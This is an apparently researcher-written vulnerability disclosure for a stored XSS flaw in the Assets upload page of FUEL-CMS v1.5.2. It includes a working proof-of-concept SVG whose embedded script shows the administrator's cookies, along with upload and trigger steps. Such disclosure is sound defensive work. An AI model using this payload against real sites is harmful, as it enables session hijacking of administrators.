# Stored XSS vulnerability in FUEL-CMS v1.5.2 of the page Assets

**vender**:

- [daylightstudio/FUEL-CMS: A CodeIgniter Content Management System](https://github.com/daylightstudio/FUEL-CMS)

**SoftLink**:

- [Release 1.5.2 · daylightstudio/FUEL-CMS](https://github.com/daylightstudio/FUEL-CMS/releases/tag/1.5.2)

**Vulnerable Page**

- Assets

**Version**

- v 1.5.2

### POC 

Save the following content as `testxss.svg`:

```svg
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <!-- Red triangle displaying user's cookie info -->
  <polygon id="cookie-alert" points="0,0 0,50 50,0" fill="#cc0000" stroke="#660000"/>
  <script type="text/javascript">
    alert(document.cookie);
  </script>
</svg>
```

1. Click **Assets**, upload `testxss.svg`, select **Images** (or any other category), and click **Upload**.

![image-20250818211523178](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202508290146246.png)

The upload succeeds.

![image-20250818211413927](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202508290146160.png)

When you visit `http://ip:port/assets/images/testxss.svg`:

![image-20250818212100795](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202508290146192.png)

The administrator’s cookies are displayed in the alert dialog.

![image-20250818211827376](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202508182118520.png)